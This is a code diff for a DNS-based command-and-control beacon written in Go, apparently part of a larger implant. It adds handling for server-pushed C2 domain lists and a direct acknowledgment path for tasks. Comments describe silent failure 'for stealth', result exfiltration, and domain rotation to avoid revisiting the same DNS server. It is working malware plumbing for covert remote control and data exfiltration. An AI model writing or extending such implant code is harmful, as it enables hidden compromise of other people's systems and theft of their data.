@@ -396,33 +396,43 @@ func (b *Beacon) runBeacon() {
 			continue // Silent failure for stealth
 		}
 
+		// Check for DOMAINS response (sent on first check-in)
+		if strings.HasPrefix(response, "DOMAINS|") {
+			domainList := response[8:] // Skip "DOMAINS|"
+			domains := strings.Split(domainList, ",")
+
+			// Update domain list
+			b.client.mutex.Lock()
+			b.client.config.DNSDomains = domains
+			b.client.domainIndex = 0
+			b.client.mutex.Unlock()
+
+			// Continue to next check-in cycle
+			continue
+		}
+
 		// Check if server has a task for us
 		taskID, command, isTask := b.parseTask(response)
 		if isTask {
 			// Check for special commands
 			if strings.HasPrefix(command, "update_domains:") {
 				// Special system command to update DNS domain list
-				// Store the domain that sent this task so we can avoid it next time
-				b.client.mutex.Lock()
-				domainThatSentUpdate := b.client.lastDomain
-				b.client.mutex.Unlock()
+				domainsJSON := command[15:] // Skip "update_domains:" prefix
 
-				// Update the domain list
-				b.handleUpdateDomains(command[15:]) // Skip "update_domains:" prefix
+				// Update the domain list FIRST
+				b.handleUpdateDomains(domainsJSON)
 
-				// Send success acknowledgment back to the ORIGINAL domain (the one that sent the task)
-				// This ensures the DNS server that issued the command knows it was completed
-				_ = b.exfiltrateResult("domains_updated", taskID)
+				// Send simple acknowledgment directly (bypass exfiltrateResult complexity)
+				// Format: RESULT|beaconID|taskID|result
+				ackMsg := fmt.Sprintf("RESULT|%s|%s|domains_updated", b.id, taskID)
+				_, _ = b.client.sendCommand(ackMsg)
 
-				// CRITICAL: Keep lastDomain set to the domain that sent the update
-				// This ensures selectDomain's Shadow Mesh logic will pick a DIFFERENT domain
-				// for the next check-in, preventing us from immediately going back to the
-				// same DNS server that might still have the task in its database
-				b.client.mutex.Lock()
-				b.client.lastDomain = domainThatSentUpdate
-				b.client.mutex.Unlock()
+				// CRITICAL: The next check-in will automatically go to a different domain
+				// because lastDomain is set to the domain that sent this task,
+				// and selectDomain's Shadow Mesh logic avoids the last used domain
 
 				// Continue to next check-in cycle immediately
+				// The sleep will happen at the top of the loop, then check-in to a different domain
 				continue
 			}
 
